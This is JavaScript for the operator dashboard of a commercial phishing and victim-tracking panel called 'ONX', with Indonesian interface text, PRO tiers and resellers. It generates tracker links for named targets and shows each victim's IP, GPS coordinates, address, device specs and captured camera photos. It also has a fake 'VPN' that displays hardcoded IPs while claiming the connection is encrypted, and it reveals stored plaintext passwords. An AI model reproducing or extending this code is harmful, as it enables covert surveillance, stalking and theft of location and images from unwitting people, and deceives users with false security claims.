// ===== VARIABLES =====
let currentUser = null;
let currentUserData = null;
let trackers = [];
let history = [];
let serverStatus = 'online';
let passwordVisible = false;
let vpnConnected = false;
let vpnServer = null;
let originalIP = '';
let currentAnnouncementData = null;
let announcementSeen = false;
let unreadCount = 0;
let currentReplyId = null;
let currentUserRole = 'free';

// Admin & owner accounts
const ADMIN_ACCOUNTS = ['zaaa', 'onedev'];

// ===== FIREBASE PATHS (UPDATED) =====
const PATHS = {
    BUYER: 'registered_users',
    RESELLER: 'Reseller_onx',
    ANNOUNCEMENT: 'Ann_onx',
    REPORT: 'Report_onx',
    REPLY: 'Ansr_onx',
    PHISHING: 'Datphis_onx',
    SERVER_STATUS: 'server_status',
    INFO_UPDATES: 'info_updates'
};

// ===== ROLE CHECK FUNCTIONS =====
function isProUser() {
    return currentUserRole === 'pro';
}

function checkFeatureAccess(featureName) {
    if (!isProUser()) {
        showNotification(`Fitur ${featureName} hanya untuk member PRO! Hubungi admin untuk upgrade.`, false);
        return false;
    }
    return true;
}

// Token functions
function b64e(s) { 
    return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); 
}

function b64d(s) { 
    s = s.replace(/-/g,'+').replace(/_/g,'/'); 
    while(s.length % 4) s += '='; 
    return atob(s); 
}

// ===== INFO UPDATE FUNCTIONS =====
let currentUpdateData = null;

function listenToUpdates() {
    if (!db) return;
    
    db.ref(PATHS.INFO_UPDATES).on('value', (snapshot) => {
        const updates = snapshot.val();
        renderUpdateList(updates);
    });
    
    db.ref('app_version').on('value', (snapshot) => {
        const version = snapshot.val();
        if (version) {
            localStorage.setItem('app_version', JSON.stringify(version));
        }
    });
}

function renderUpdateList(updates) {
    const container = document.getElementById('updateList');
    if (!container) return;
    
    if (!updates || Object.keys(updates).length === 0) {
        container.innerHTML = `
            <div class="loading-state">
                <i class="fas fa-inbox"></i>
                <p>Belum ada update</p>
            </div>
        `;
        return;
    }
    
    const updatesArray = Object.entries(updates).map(([key, data]) => ({
        id: key,
        ...data
    })).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    
    let html = '';
    
    updatesArray.forEach((update) => {
        if (!update || !update.id) return;
        
        const date = update.timestamp ? new Date(update.timestamp) : new Date();
        const formattedDate = date.toLocaleDateString('id-ID', {
            day: 'numeric',
            month: 'short',
            year: 'numeric'
        });
        
        const title = update.title || 'Update Baru';
        const updateId = update.id;
        
        html += `
            <div class="info-list-item" onclick="openUpdateDetail('${updateId}')">
                <div class="info-list-item-header">
                    <div class="info-list-icon">
                        <i class="fas fa-code-branch"></i>
                    </div>
                    <div class="info-list-info">
                        <div class="info-list-title">${escapeHtml(title)}</div>
                        <div class="info-list-date">
                            <i class="far fa-calendar-alt"></i> ${formattedDate}
                        </div>
                    </div>
                    <i class="fas fa-chevron-right" style="color: #6b7280; font-size: 14px;"></i>
                </div>
            </div>
        `;
    });
    
    container.innerHTML = html;
}

function openUpdateDetail(updateId) {
    if (!updateId) return;
    
    db.ref(PATHS.INFO_UPDATES + '/' + updateId).once('value', (snapshot) => {
        const update = snapshot.val();
        if (!update) return;
        
        const date = update.timestamp ? new Date(update.timestamp) : new Date();
        const formattedDate = date.toLocaleDateString('id-ID', {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
        const formattedTime = date.toLocaleTimeString('id-ID', {
            hour: '2-digit',
            minute: '2-digit'
        });
        
        const contentLines = (update.content || '').split('\n').filter(line => line.trim());
        const description = contentLines[0] || 'Tidak ada deskripsi';
        const changelogItems = contentLines.slice(1);
        
        const html = `
            <div class="update-detail-card">
                <div class="update-detail-header">
                    <div class="update-detail-icon">
                        <i class="fas fa-code-branch"></i>
                    </div>
                    <h2>${escapeHtml(update.title || 'Update Baru')}</h2>
                    <div class="update-detail-meta">
                        <span><i class="far fa-calendar-alt"></i> ${formattedDate}</span>
                        <span><i class="far fa-clock"></i> ${formattedTime}</span>
                        <span><i class="fas fa-fingerprint"></i> #${updateId.slice(-6)}</span>
                    </div>
                </div>
                <div class="update-detail-body">
                    <div class="update-description-box">
                        <p>${escapeHtml(description)}</p>
                    </div>
                    <div class="update-changelog-box">
                        <h4><i class="fas fa-list-check"></i> DAFTAR PERUBAHAN</h4>
                        <ul class="update-changelog-list">
                            ${changelogItems.length > 0 ? 
                                changelogItems.map(item => `
                                    <li><i class="fas fa-chevron-right"></i> ${escapeHtml(item.trim())}</li>
                                `).join('') : 
                                '<li><i class="fas fa-info-circle"></i> Tidak ada detail perubahan</li>'
                            }
                        </ul>
                    </div>
                </div>
                <div class="update-detail-footer">
                    <span><i class="fas fa-user-shield"></i> ONX Team</span>
                    <span><i class="fas fa-check-circle"></i> Update Resmi</span>
                </div>
            </div>
        `;
        
        document.getElementById('updateDetailContent').innerHTML = html;
        document.getElementById('fsUpdateTitle').innerHTML = `<i class="fas fa-history"></i> ${escapeHtml(update.title || 'Detail Update')}`;
        document.getElementById('updateFullscreen').style.display = 'flex';
    }).catch(err => {
        console.error('Error fetching update:', err);
    });
}

function closeUpdateFullscreen() {
    document.getElementById('updateFullscreen').style.display = 'none';
    currentUpdateData = null;
}

function loadInfoUpdates() {
    if (!db) return;
    db.ref(PATHS.INFO_UPDATES).once('value', (snapshot) => {
        renderUpdateList(snapshot.val());
    });
}

// ===== INBOX JAWABAN REPORT (UPDATED) =====
function listenToUserReplies() {
    if (!currentUser) return;
    
    db.ref(PATHS.REPLY + '/' + currentUser).on('value', (snapshot) => {
        const replies = snapshot.val();
        updateInboxBadge(replies);
        renderInboxList(replies);
    });
}

function updateInboxBadge(replies) {
    const badge = document.getElementById('inboxBadge');
    if (!badge) return;
    
    if (!replies) {
        badge.style.display = 'none';
        unreadCount = 0;
        return;
    }
    
    const unread = Object.values(replies).filter(r => r.read !== true).length;
    unreadCount = unread;
    
    if (unread > 0) {
        badge.textContent = unread > 9 ? '9+' : unread;
        badge.style.display = 'flex';
    } else {
        badge.style.display = 'none';
    }
}

function renderInboxList(replies) {
    const container = document.getElementById('inboxList');
    if (!container) return;
    
    if (!replies || Object.keys(replies).length === 0) {
        container.innerHTML = `
            <div class="loading-state">
                <i class="fas fa-inbox"></i>
                <p>Belum ada balasan</p>
            </div>
        `;
        return;
    }
    
    const repliesArray = Object.entries(replies).map(([id, data]) => ({
        id,
        ...data
    })).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    
    let html = '';
    
    repliesArray.forEach(reply => {
        const isRead = reply.read === true;
        const date = reply.timestamp ? new Date(reply.timestamp) : new Date();
        const formattedDate = date.toLocaleDateString('id-ID', {
            day: 'numeric',
            month: 'short',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });
        
        const preview = reply.message ? reply.message.substring(0, 50) : 'Tidak ada pesan';
        
        html += `
            <div class="inbox-item ${isRead ? 'read' : 'unread'}" onclick="openReplyDetail('${reply.id}')">
                <div class="inbox-item-header">
                    <div class="inbox-item-icon">
                        <i class="fas fa-reply-all"></i>
                    </div>
                    <div class="inbox-item-info">
                        <div class="inbox-item-from">From: ${escapeHtml(reply.adminName || 'Admin')}</div>
                        <div class="inbox-item-preview">${escapeHtml(preview)}...</div>
                        <div class="inbox-item-date">
                            <i class="far fa-clock"></i> ${formattedDate}
                            <span class="status-badge ${isRead ? 'read' : 'unread'}">${isRead ? '✓ READ' : '● UNREAD'}</span>
                        </div>
                    </div>
                    ${!isRead ? '<div class="inbox-badge-unread"></div>' : ''}
                </div>
            </div>
        `;
    });
    
    container.innerHTML = html;
}

function openInboxModal() {
    const fullscreen = document.getElementById('inboxFullscreen');
    if (fullscreen) fullscreen.style.display = 'flex';
}

function closeInboxFullscreen() {
    const fullscreen = document.getElementById('inboxFullscreen');
    if (fullscreen) fullscreen.style.display = 'none';
}

function openReplyDetail(replyId) {
    currentReplyId = replyId;
    
    db.ref(PATHS.REPLY + '/' + currentUser + '/' + replyId).once('value', (snapshot) => {
        const reply = snapshot.val();
        if (!reply) return;
        
        if (reply.read !== true) {
            db.ref(PATHS.REPLY + '/' + currentUser + '/' + replyId + '/read').set(true);
            db.ref(PATHS.REPLY + '/' + currentUser + '/' + replyId + '/readAt').set(Date.now());
        }
        
        const date = reply.timestamp ? new Date(reply.timestamp) : new Date();
        const formattedDate = date.toLocaleDateString('id-ID', {
            day: 'numeric',
            month: 'long',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });
        
        const html = `
            <div class="reply-detail-card">
                <div class="reply-detail-header">
                    <div class="reply-detail-icon">
                        <i class="fas fa-reply-all"></i>
                    </div>
                    <h2>JAWABAN LAPORAN</h2>
                    <div class="reply-detail-meta">
                        <span><i class="fas fa-user-shield"></i> ${escapeHtml(reply.adminName || 'Admin')}</span>
                        <span><i class="far fa-calendar-alt"></i> ${formattedDate}</span>
                    </div>
                </div>
                <div class="reply-detail-body">
                    <div class="reply-message-box">
                        <div class="reply-message-label">
                            <i class="fas fa-comment-dots"></i> PESAN JAWABAN
                        </div>
                        <div class="reply-message-text">
                            ${escapeHtml(reply.message || 'Tidak ada pesan')}
                        </div>
                    </div>
                    ${reply.note ? `
                    <div class="reply-message-box">
                        <div class="reply-message-label">
                            <i class="fas fa-sticky-note"></i> CATATAN ADMIN
                        </div>
                        <div class="reply-message-text">
                            ${escapeHtml(reply.note)}
                        </div>
                    </div>
                    ` : ''}
                </div>
                <div class="reply-footer">
                    <p>Thank you for asking / reports to team ONX</p>
                    <p>See you in the next time 👋</p>
                    <p><strong>SPECIAL FOR YOU FROM ${escapeHtml(reply.adminName || 'ONX Team')}</strong></p>
                </div>
            </div>
        `;
        
        document.getElementById('replyDetailContent').innerHTML = html;
        document.getElementById('replyDetailFullscreen').style.display = 'flex';
    });
}

function closeReplyDetailFullscreen() {
    document.getElementById('replyDetailFullscreen').style.display = 'none';
    currentReplyId = null;
}

// ===== ANNOUNCEMENT FUNCTIONS (UPDATED) =====
function listenToAnnouncements() {
    if (!currentUser) return;
    
    db.ref(PATHS.ANNOUNCEMENT).on('value', (snapshot) => {
        const data = snapshot.val();
        const now = Date.now();
        let activeAnnouncement = null;
        let activeId = null;
        
        if (data) {
            for (const [id, ann] of Object.entries(data)) {
                if (ann.expireAt > now) {
                    activeAnnouncement = ann;
                    activeId = id;
                    break;
                }
            }
        }
        
        const floatingBtn = document.getElementById('floatingAnnouncementBtn');
        const badge = document.getElementById('announcementBadge');
        
        if (activeAnnouncement) {
            currentAnnouncementData = { ...activeAnnouncement, id: activeId };
            floatingBtn.style.display = 'flex';
            
            const viewersRef = db.ref(PATHS.ANNOUNCEMENT + '/' + activeId + '/viewers/' + currentUser);
            viewersRef.once('value').then((snap) => {
                if (!snap.val()) {
                    badge.style.display = 'flex';
                    announcementSeen = false;
                } else {
                    badge.style.display = 'none';
                    announcementSeen = true;
                }
            });
        } else {
            floatingBtn.style.display = 'none';
            currentAnnouncementData = null;
        }
    });
}

function openAnnouncementFullscreen() {
    if (!currentAnnouncementData) return;
    
    const fullscreen = document.getElementById('announcementFullscreen');
    const textEl = document.getElementById('announcementFullscreenText');
    const dateEl = document.getElementById('announcementFullscreenDate');
    
    textEl.textContent = currentAnnouncementData.text;
    const expireDate = new Date(currentAnnouncementData.expireAt);
    dateEl.innerHTML = `<i class="far fa-calendar-alt"></i> Berlaku hingga: ${expireDate.toLocaleString('id-ID')}`;
    
    fullscreen.style.display = 'flex';
    
    if (!announcementSeen) {
        db.ref(PATHS.ANNOUNCEMENT + '/' + currentAnnouncementData.id + '/viewers/' + currentUser).set(true);
        document.getElementById('announcementBadge').style.display = 'none';
        announcementSeen = true;
    }
}

function closeAnnouncementFullscreen() {
    document.getElementById('announcementFullscreen').style.display = 'none';
}

// ===== REPORT FUNCTIONS (UPDATED) =====
function openReportFullscreen() {
    document.getElementById('reportFullscreen').style.display = 'flex';
    document.getElementById('reportMessageInput').value = '';
}

function closeReportFullscreen() {
    document.getElementById('reportFullscreen').style.display = 'none';
}

function submitReport() {
    const message = document.getElementById('reportMessageInput').value.trim();
    
    if (!message) {
        showNotification('Laporan tidak boleh kosong!', false);
        return;
    }
    
    if (!currentUser) {
        showNotification('Anda belum login!', false);
        return;
    }
    
    const reportData = {
        username: currentUser,
        message: message,
        timestamp: Date.now(),
        status: 'pending'
    };
    
    const reportId = Date.now().toString();
    
    db.ref(PATHS.REPORT + '/' + reportId).set(reportData)
        .then(() => {
            showNotification('Laporan terkirim! Terima kasih.', true);
            closeReportFullscreen();
        })
        .catch((error) => {
            showNotification('Gagal mengirim: ' + error.message, false);
        });
}

// ===== VPN FUNCTIONS =====
function showVPNModal() {
    const modal = document.getElementById('vpnModalOverlay');
    if (!modal) return;
    
    const mainCountry = document.getElementById('vpnCountry');
    const modalCountry = document.getElementById('vpnModalCountry');
    if (mainCountry && modalCountry) {
        modalCountry.value = mainCountry.value;
    }
    
    modal.style.display = 'flex';
}

function closeVPNModal() {
    const modal = document.getElementById('vpnModalOverlay');
    if (modal) {
        modal.style.display = 'none';
    }
}

function activateVPNFromModal() {
    const modalCountry = document.getElementById('vpnModalCountry');
    const mainCountry = document.getElementById('vpnCountry');
    
    if (mainCountry && modalCountry) {
        mainCountry.value = modalCountry.value;
    }
    
    if (typeof toggleVPN === 'function') {
        toggleVPN();
    }
    
    closeVPNModal();
    showVPNNotification('VPN Activated - You are now protected!');
}

function checkVPNStatusAndShowReminder() {
    if (!vpnConnected) {
        showVPNModal();
    } else {
        closeVPNModal();
    }
}

function showVPNNotification(message) {
    const oldNotif = document.querySelector('.vpn-notification');
    if (oldNotif) oldNotif.remove();
    
    const notif = document.createElement('div');
    notif.className = 'vpn-notification';
    notif.innerHTML = `
        <i class="fas fa-shield-alt"></i>
        <span>${message}</span>
    `;
    document.body.appendChild(notif);
    
    setTimeout(() => {
        notif.style.opacity = '0';
        setTimeout(() => {
            if (notif.parentNode) notif.remove();
        }, 300);
    }, 3000);
}

function checkVPNOnLoad() {
    setTimeout(() => {
        checkVPNStatusAndShowReminder();
    }, 1500);
}

async function getRealIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        originalIP = data.ip;
        
        const ipElements = document.querySelectorAll('#vpnRealIP, #vpnIP');
        ipElements.forEach(el => {
            if (el) el.textContent = originalIP;
        });
        
        return originalIP;
    } catch {
        originalIP = 'Unknown';
        const ipElements = document.querySelectorAll('#vpnRealIP, #vpnIP');
        ipElements.forEach(el => {
            if (el) el.textContent = 'Unknown';
        });
        return 'Unknown';
    }
}

function toggleVPN() {
    const toggleBtn = document.getElementById('vpnToggleBtn');
    const vpnIcon = document.getElementById('vpnIcon');
    const statusIcon = document.getElementById('vpnStatusIcon');
    const statusTitle = document.getElementById('vpnStatusTitle');
    const statusSubtitle = document.getElementById('vpnStatusSubtitle');
    const vpnInfo = document.getElementById('vpnInfo');
    const countrySelect = document.getElementById('vpnCountry');
    
    if (!toggleBtn || !vpnIcon || !statusIcon || !statusTitle || !statusSubtitle || !vpnInfo || !countrySelect) {
        console.error('VPN elements not found!');
        return;
    }
    
    vpnConnected = !vpnConnected;
    
    if (vpnConnected) {
        toggleBtn.classList.add('active');
        vpnIcon.className = 'fas fa-check';
        statusIcon.classList.add('connected');
        statusIcon.innerHTML = '<i class="fas fa-shield-alt"></i>';
        
        const country = countrySelect.value;
        const countryText = countrySelect.options[countrySelect.selectedIndex].text;
        
        let vpnIP = '';
        switch(country) {
            case 'singapore': vpnIP = '103.25.1.1'; break;
            case 'japan': vpnIP = '45.76.1.1'; break;
            case 'usa': vpnIP = '104.28.1.1'; break;
            case 'uk': vpnIP = '185.15.1.1'; break;
            case 'germany': vpnIP = '85.25.1.1'; break;
            case 'netherlands': vpnIP = '195.35.1.1'; break;
            default: vpnIP = '10.0.0.1';
        }
        
        statusTitle.textContent = 'VPN Connected';
        statusSubtitle.innerHTML = `Server: ${countryText.split(' ')[1] || country} · IP: <span style="color:#10b981;">${vpnIP}</span>`;
        vpnInfo.innerHTML = '<i class="fas fa-lock"></i> VPN Active - Your connection is encrypted';
        
        showNotification('VPN Connected - Connection secured', true);
        showVPNNotification('VPN Connected - You are protected!');
        vpnServer = country;
        updateVPNStatusBar(true);
        
        closeVPNModal();
        
    } else {
        toggleBtn.classList.remove('active');
        vpnIcon.className = 'fas fa-power-off';
        statusIcon.classList.remove('connected');
        
        statusTitle.textContent = 'VPN Disconnected';
        statusSubtitle.innerHTML = `Your IP: <span style="color:#2a85ff;">${originalIP || 'Loading...'}</span>`;
        vpnInfo.innerHTML = '<i class="fas fa-lock-open"></i> VPN Disconnected - Your IP is visible';
        
        showNotification('VPN Disconnected', false);
        showVPNNotification('VPN Disconnected - Your IP is exposed!');
        vpnServer = null;
        updateVPNStatusBar(false);
        
        showVPNModal();
    }
}

function updateVPNStatusBar(connected) {
    if (connected) {
        let metaTheme = document.querySelector('meta[name="theme-color"]');
        if (!metaTheme) {
            metaTheme = document.createElement('meta');
            metaTheme.name = 'theme-color';
            document.head.appendChild(metaTheme);
        }
        metaTheme.content = '#10b981';
        
        let link = document.querySelector("link[rel~='icon']");
        if (!link) {
            link = document.createElement('link');
            link.rel = 'icon';
            document.head.appendChild(link);
        }
        link.href = 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>';
        
    } else {
        let metaTheme = document.querySelector('meta[name="theme-color"]');
        if (metaTheme) metaTheme.content = '#0a0a0f';
        
        let link = document.querySelector("link[rel~='icon']");
        if (link) link.href = 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔓</text></svg>';
    }
}

// ===== MAINTENANCE CHECK =====
function checkMaintenanceAccess(username) {
    if (serverStatus === 'maintenance') {
        return ADMIN_ACCOUNTS.includes(username);
    }
    return true;
}

// ===== SERVER STATUS =====
function listenToServerStatus() {
    db.ref(PATHS.SERVER_STATUS).on('value', (s) => {
        const data = s.val();
        serverStatus = data ? data.status : 'online';
        const line = document.getElementById('serverStatusLine');
        if (line) line.className = 'server-status-line ' + serverStatus;
        
        const maintPage = document.getElementById('maintenancePage');
        const dashboard = document.getElementById('dashboard');
        const loginCard = document.getElementById('loginCard');
        
        if (serverStatus === 'maintenance' && currentUser && !ADMIN_ACCOUNTS.includes(currentUser)) {
            if (dashboard) dashboard.style.display = 'none';
            if (loginCard) loginCard.style.display = 'none';
            if (maintPage) maintPage.style.display = 'flex';
        } else if (serverStatus === 'maintenance' && (!currentUser || ADMIN_ACCOUNTS.includes(currentUser))) {
            if (maintPage) maintPage.style.display = 'none';
        } else {
            if (maintPage) maintPage.style.display = 'none';
        }
        
        updateJadwalStatus();
    });
}

// ===== NAVIGATION =====
function switchPage(page, element) {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    if(element) element.classList.add('active');
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    
    const accountCard = document.getElementById('phisingAccountCard');
    
    if (page === 'dashboard') {
        if (accountCard) accountCard.style.display = 'block';
        document.getElementById('dashboardPage').classList.add('active');
        renderTrackerList();
    } else if (page === 'vpn') {
        if (accountCard) accountCard.style.display = 'none';
        document.getElementById('vpnPage').classList.add('active');
        getRealIP();
    } else if (page === 'profile') {
        if (accountCard) accountCard.style.display = 'none';
        document.getElementById('profilePage').classList.add('active');
        updateDeviceInfo();
    } else if (page === 'info') {
        if (accountCard) accountCard.style.display = 'none';
        document.getElementById('infoPage').classList.add('active');
        loadInfoUpdates();
    } else if (page === 'tools') {
        if (accountCard) accountCard.style.display = 'none';
        document.getElementById('toolsPage').classList.add('active');
    }
}

function openAddTargetFromNav() {
    if (serverStatus !== 'online') {
        if (serverStatus === 'maintenance' && !ADMIN_ACCOUNTS.includes(currentUser)) {
            return showNotification('Maintenance mode', false);
        }
        if (serverStatus === 'offline') {
            return showNotification('Server offline', false);
        }
    }
    openModal('addTrackerModal');
}

function backToList() {
    document.getElementById('previewPage').classList.remove('active');
    document.getElementById('dashboardPage').classList.add('active');
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    const dashboardNav = document.querySelector('.nav-item[onclick*="switchPage(\'dashboard\', this)"]');
    if (dashboardNav) dashboardNav.classList.add('active');
}

// ===== DOWNLOADER =====
function openDownloader(type) {
    if (serverStatus === 'maintenance' && !ADMIN_ACCOUNTS.includes(currentUser)) {
        showNotification('Maintenance mode', false);
        return;
    }
    
    if(type === 'tiktok') document.getElementById('tiktokDownloader').style.display = 'flex';
    else if(type === 'instagram') document.getElementById('instagramDownloader').style.display = 'flex';
    else if(type === 'youtube') document.getElementById('youtubeDownloader').style.display = 'flex';
}

function closeDownloader(id) {
    document.getElementById(id).style.display = 'none';
    if(id === 'tiktokDownloader') {
        document.getElementById('tiktokUrl').value = '';
        document.getElementById('tiktokResult').style.display = 'none';
    } else if(id === 'instagramDownloader') {
        document.getElementById('instagramUrl').value = '';
        document.getElementById('instagramResult').style.display = 'none';
    } else if(id === 'youtubeDownloader') {
        document.getElementById('youtubeUrl').value = '';
        document.getElementById('youtubeResult').style.display = 'none';
    }
}

async function downloadTikTok() {
    const url = document.getElementById('tiktokUrl').value.trim();
    if(!url) return showNotification('Masukkan URL TikTok');
    showNotification('Mengambil data...');
    try {
        const apiUrl = `https://tikwm.com/api/?url=${encodeURIComponent(url)}`;
        const response = await fetch(apiUrl);
        const data = await response.json();
        if(data.code === 0) {
            const videoUrl = data.data.play;
            const title = data.data.title;
            const desc = data.data.desc || 'TikTok Video';
            document.getElementById('tiktokVideo').src = videoUrl;
            document.getElementById('tiktokTitle').textContent = title;
            document.getElementById('tiktokDesc').textContent = desc;
            document.getElementById('tiktokResult').style.display = 'block';
            document.getElementById('tiktokDownloadBtn').setAttribute('data-url', videoUrl);
        } else showNotification('Gagal mengambil video');
    } catch(e) { showNotification('Error: ' + e.message); }
}

async function downloadInstagram() {
    const url = document.getElementById('instagramUrl').value.trim();
    if(!url) return showNotification('Masukkan URL Instagram');
    showNotification('Mengambil data...');
    try {
        const response = await fetch(`https://instagram-downloader-download-instagram-videos-stories1.p.rapidapi.com/get-info-rapidapi?url=${encodeURIComponent(url)}`, {
            headers: {
                'X-RapidAPI-Key': 'demo-key',
                'X-RapidAPI-Host': 'instagram-downloader-download-instagram-videos-stories1.p.rapidapi.com'
            }
        });
        const data = await response.json();
        if(data.video) {
            document.getElementById('instagramVideo').src = data.video;
            document.getElementById('instagramTitle').textContent = data.title || 'Instagram Video';
            document.getElementById('instagramDesc').textContent = 'Instagram Reels';
            document.getElementById('instagramResult').style.display = 'block';
            document.getElementById('instagramDownloadBtn').setAttribute('data-url', data.video);
        } else showNotification('Gagal mengambil video');
    } catch(e) { showNotification('Error: ' + e.message); }
}

async function downloadYouTube() {
    const url = document.getElementById('youtubeUrl').value.trim();
    if(!url) return showNotification('Masukkan URL YouTube');
    showNotification('Mengambil data...');
    try {
        const response = await fetch(`https://youtube-video-download-info.p.rapidapi.com/dl?id=${getYouTubeId(url)}`, {
            headers: {
                'X-RapidAPI-Key': 'demo-key',
                'X-RapidAPI-Host': 'youtube-video-download-info.p.rapidapi.com'
            }
        });
        const data = await response.json();
        if(data.videoDetails) {
            const videoUrl = data.formats.find(f => f.hasVideo && f.hasAudio)?.url || data.formats[0]?.url;
            document.getElementById('youtubeVideo').src = videoUrl;
            document.getElementById('youtubeTitle').textContent = data.videoDetails.title;
            document.getElementById('youtubeDesc').textContent = 'YouTube Video';
            document.getElementById('youtubeResult').style.display = 'block';
            document.getElementById('youtubeDownloadBtn').setAttribute('data-url', videoUrl);
        } else showNotification('Gagal mengambil video');
    } catch(e) { showNotification('Error: ' + e.message); }
}

function getYouTubeId(url) {
    const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|&v=)([^#&?]*).*/;
    const match = url.match(regExp);
    return (match && match[2].length === 11) ? match[2] : null;
}

function downloadVideo(type) {
    const btn = document.getElementById(type + 'DownloadBtn');
    const url = btn.getAttribute('data-url');
    if(url) window.open(url, '_blank');
}

// ===== CONTACT DROPDOWN =====
function toggleContact(sectionId) {
    const section = document.getElementById(sectionId);
    section.classList.toggle('open');
}

// ===== PASSWORD TOGGLE =====
function togglePassword() {
    const disp = document.getElementById('passwordDisplay');
    const eye = document.getElementById('eyeIcon');
    if(passwordVisible) {
        disp.textContent = '••••••••';
        eye.className = 'fas fa-eye';
    } else {
        disp.textContent = currentUserData ? currentUserData.password : '••••••••';
        eye.className = 'fas fa-eye-slash';
    }
    passwordVisible = !passwordVisible;
}

// ===== WORLD CLOCK =====
function updateWorldClock() {
    const now = new Date();
    document.getElementById('worldClock').textContent = 
        now.toLocaleTimeString('id-ID',{timeZone:'Asia/Jakarta',hour12:false});
}

// ===== REFRESH =====
function refreshData() {
    const btn = document.getElementById('refreshBtn');
    btn.classList.add('rotating');
    if(currentUser) {
        db.ref(PATHS.BUYER + '/' + currentUser + '/trackers').once('value', s => {
            trackers = s.val() || [];
            renderTrackerList();
            setTimeout(() => btn.classList.remove('rotating'), 500);
        });
    } else setTimeout(() => btn.classList.remove('rotating'), 500);
}

// ===== RENDER TRACKER LIST =====
function renderTrackerList() {
    const list = document.getElementById('trackerList');
    if(!list) return;
    
    if(!trackers || trackers.length === 0) {
        list.innerHTML = '<div style="text-align:center; padding:30px; color:#6b7280; font-size:12px;">No targets yet<br><small style="font-size:10px;">Click + to create</small></div>';
        return;
    }
    let html = '';
    trackers.forEach((t, i) => {
        const hasData = t.data && t.data.ip;
        html += `
            <div class="tracker-item ${hasData ? 'has-data' : ''}" onclick="openPreview(${i})">
                <div class="tracker-item-header">
                    <div class="tracker-icon">
                        <i class="fas fa-bug"></i>
                        ${hasData ? '<span class="data-badge"></span>' : ''}
                    </div>
                    <div class="tracker-info">
                        <div class="tracker-name">${escapeHtml(t.name)}</div>
                        <div class="tracker-desc">${t.time || 'Just now'} ${hasData ? '· Data ready' : ''}</div>
                    </div>
                </div>
            </div>
        `;
    });
    list.innerHTML = html;
}

function escapeHtml(t) {
    const d = document.createElement('div');
    d.textContent = t;
    return d.innerHTML;
}

// ===== PREVIEW =====
function openPreview(index) {
    const t = trackers[index];
    document.getElementById('previewTitle').textContent = t.name;
    const c = document.getElementById('previewContent');
    if(!t.data) {
        c.innerHTML = `
            <div class="preview-card" style="text-align:center;">
                <i class="fas fa-hourglass-half" style="font-size:40px; color:#2a85ff;"></i>
                <p style="color:#6b7280; margin:12px 0;">Waiting...</p>
                <p style="font-size:10px; word-break:break-all;">${t.link}</p>
                <div class="preview-actions">
                    <div class="preview-btn" onclick="copyLink('${t.link}')">COPY LINK</div>
                    <div class="preview-btn delete" onclick="deleteTracker(${index})">DELETE</div>
                </div>
            </div>
        `;
    } else {
        const d = t.data;
        const p = d.photos ? Object.values(d.photos) : [];
        let ph = '';
        if(p.length > 0) p.slice(0,6).forEach(f => ph += `<div class="preview-photo" onclick="openZoom('${f}')"><img src="${f}"></div>`);
        else for(let i=0; i<3; i++) ph += '<div class="preview-photo"><i class="fas fa-camera"></i></div>';
        
        c.innerHTML = `
            <div class="preview-card">
                <div class="preview-section">
                    <div class="preview-section-title"><i class="fas fa-map-marker-alt"></i> LOCATION</div>
                    <div class="preview-grid">
                        <div class="preview-row"><span class="preview-label">IP</span><span class="preview-value">${d.ip || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">Coordinates</span><span class="preview-value">${d.loc || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">Address</span><span class="preview-value">${d.address || 'Unknown'}</span></div>
                    </div>
                    ${d.loc ? `<button class="map-button" onclick="window.open('https://www.google.com/maps?q=${d.loc}','_blank')"><i class="fas fa-map-marked-alt"></i> VIEW MAP</button>` : ''}
                </div>
                <div class="preview-section">
                    <div class="preview-section-title"><i class="fas fa-mobile-alt"></i> DEVICE</div>
                    <div class="preview-grid">
                        <div class="preview-row"><span class="preview-label">Time</span><span class="preview-value">${d.time || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">RAM</span><span class="preview-value">${d.ram || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">CPU</span><span class="preview-value">${d.cpu || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">OS</span><span class="preview-value">${d.android || d.os || 'Unknown'}</span></div>
                    </div>
                </div>
                <div class="preview-section">
                    <div class="preview-section-title"><i class="fas fa-camera"></i> PHOTOS</div>
                    <div class="preview-photo-grid">${ph}</div>
                </div>
                <div class="preview-actions">
                    <div class="preview-btn" onclick="copyLink('${t.link}')">COPY LINK</div>
                    <div class="preview-btn delete" onclick="deleteTracker(${index})">DELETE</div>
                </div>
            </div>
        `;
    }
    document.getElementById('dashboardPage').classList.remove('active');
    document.getElementById('previewPage').classList.add('active');
    const accountCard = document.getElementById('phisingAccountCard');
    if (accountCard) accountCard.style.display = 'none';
}

// ===== CREATE TRACKER =====
function createTracker() {
    if(serverStatus !== 'online') return showNotification('Server ' + serverStatus, false);
    const name = document.getElementById('trackerNameInput').value.trim();
    if(!name) return showNotification('Enter name');
    const id = Date.now().toString();
    const token = b64e(currentUser);
    const link = window.location.href.split('?')[0] + '?id=' + id + '&t=' + token;
    trackers.push({id, name, link, time: new Date().toLocaleTimeString(), data: null});
    if(currentUser) db.ref(PATHS.BUYER + '/' + currentUser + '/trackers').set(trackers);
    closeModal('addTrackerModal');
    document.getElementById('trackerNameInput').value = '';
    renderTrackerList();
    showNotification('Link created');
}

function deleteTracker(index) {
    if(confirm('Delete?')) {
        const t = trackers[index];
        if(t.data) {
            history.unshift({id: t.id, name: t.name, date: new Date().toLocaleString(), data: t.data});
            if(history.length > 50) history.pop();
